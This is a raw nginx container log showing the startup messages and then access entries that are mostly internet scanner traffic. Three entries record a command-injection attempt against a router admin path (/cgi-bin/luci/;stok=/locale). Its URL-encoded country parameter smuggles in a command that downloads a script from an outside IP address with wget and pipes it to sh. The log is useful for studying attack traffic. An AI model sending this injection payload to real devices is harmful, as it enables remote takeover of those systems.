/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration
/docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/
/docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh
10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf
10-listen-on-ipv6-by-default.sh: info: /etc/nginx/conf.d/default.conf differs from the packaged version
/docker-entrypoint.sh: Sourcing /docker-entrypoint.d/15-local-resolvers.envsh
/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh
/docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh
/docker-entrypoint.sh: Configuration complete; ready for start up
2024/11/06 20:44:43 [notice] 19#19: using the "epoll" event method
2024/11/06 20:44:43 [notice] 19#19: nginx/1.27.2
2024/11/06 20:44:43 [notice] 19#19: built by gcc 13.2.1 20240309 (Alpine 13.2.1_git20240309) 
2024/11/06 20:44:43 [notice] 19#19: OS: Linux 5.10.102.2-microsoft-standard
2024/11/06 20:44:43 [notice] 19#19: getrlimit(RLIMIT_NOFILE): 1024:1048576
2024/11/06 20:44:43 [notice] 19#19: start worker processes
2024/11/06 20:44:43 [notice] 19#19: start worker process 46
10.92.0.9 - - [06/Nov/2024:22:05:02 +0000] "GET / HTTP/1.1" 200 459 "-" "-" "-"
10.92.0.9 - - [06/Nov/2024:22:10:42 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 459 "-" "-" "-"
10.92.0.10 - - [06/Nov/2024:22:11:17 +0000] "GET / HTTP/1.1" 200 459 "-" "-" "-"
10.92.0.10 - - [06/Nov/2024:22:23:54 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F45.202.35.24%2Fl+-O-%7C+sh%60) HTTP/1.1" 200 459 "-" "Go-http-client/1.1" "-"
10.92.0.9 - - [06/Nov/2024:22:28:38 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "-"
10.92.0.10 - - [06/Nov/2024:22:31:23 +0000] "GET / HTTP/1.0" 200 459 "-" "mukewang/7.2.0 (iPhone; iOS 12.3.1; Scale/2.00) webview" "-"
10.92.0.9 - - [06/Nov/2024:22:35:51 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" "-"
10.92.0.9 - - [06/Nov/2024:22:46:57 +0000] "GET / HTTP/1.0" 200 459 "-" "-" "-"
10.92.0.9 - - [06/Nov/2024:22:49:20 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
10.92.0.9 - - [06/Nov/2024:23:04:30 +0000] "GET /ReportServer HTTP/1.1" 200 459 "-" "Mozilla/5.0 zgrab/0.x" "-"
10.92.0.9 - - [06/Nov/2024:23:04:44 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F45.202.35.24%2Fl+-O-%7C+sh%60) HTTP/1.1" 200 459 "-" "Go-http-client/1.1" "-"
10.92.0.9 - - [06/Nov/2024:23:12:08 +0000] "GET / HTTP/1.0" 200 459 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "-"
10.92.0.10 - - [06/Nov/2024:23:15:35 +0000] "GET / HTTP/1.0" 200 459 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "-"
10.92.0.10 - - [06/Nov/2024:23:15:36 +0000] "GET / HTTP/1.0" 200 459 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "-"
10.92.0.10 - - [06/Nov/2024:23:16:50 +0000] "GET / HTTP/1.0" 200 459 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "-"
10.92.0.9 - - [06/Nov/2024:23:54:00 +0000] "GET / HTTP/1.1" 200 459 "-" "python-requests/2.32.3" "-"
10.92.0.9 - - [07/Nov/2024:00:14:58 +0000] "GET / HTTP/1.1" 200 459 "-" "-" "-"
10.92.0.9 - - [07/Nov/2024:00:15:06 +0000] "GET / HTTP/1.1" 200 459 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
10.92.0.9 - - [07/Nov/2024:00:15:07 +0000] "GET /vite.svg HTTP/1.1" 200 1497 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
10.92.0.9 - - [07/Nov/2024:00:15:09 +0000] "GET /favicon.ico HTTP/1.1" 200 459 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
10.92.0.9 - - [07/Nov/2024:00:15:11 +0000] "PRI * HTTP/2.0" 400 157 "-" "-" "-"
10.92.0.10 - - [07/Nov/2024:00:27:56 +0000] "GET / HTTP/1.1" 200 459 "-" "-" "-"
10.92.0.9 - - [07/Nov/2024:00:33:38 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F45.202.35.24%2Fl+-O-%7C+sh%60) HTTP/1.1" 200 459 "-" "Go-http-client/1.1" "-"
